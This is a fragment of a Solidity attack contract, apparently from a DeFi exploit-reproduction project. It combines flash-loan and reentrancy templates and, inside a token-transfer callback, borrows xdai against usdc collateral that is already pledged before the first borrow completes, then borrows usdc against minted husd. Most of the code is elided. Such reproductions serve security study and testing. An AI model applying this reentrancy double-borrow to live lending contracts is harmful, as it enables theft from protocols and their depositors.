...
import "templates/flashloan/FlashLoan.sol";
import "templates/reentrancy/Reentrancy.sol";
import "templates/tokens/Tokens.sol";
    ...
    function _executeAttack() internal override(FlashLoan, Reentrancy) {
        if (msg.sig == this.onTokenTransfer.selector) {
            ...
            if (from == address(husd) && !borrowedXdai) {
                ...
                // Borrow xdai against the same usdc collateral, since the initial borrow transaction hasn't completed
            ...
            // Borrow usdc against our minted husd
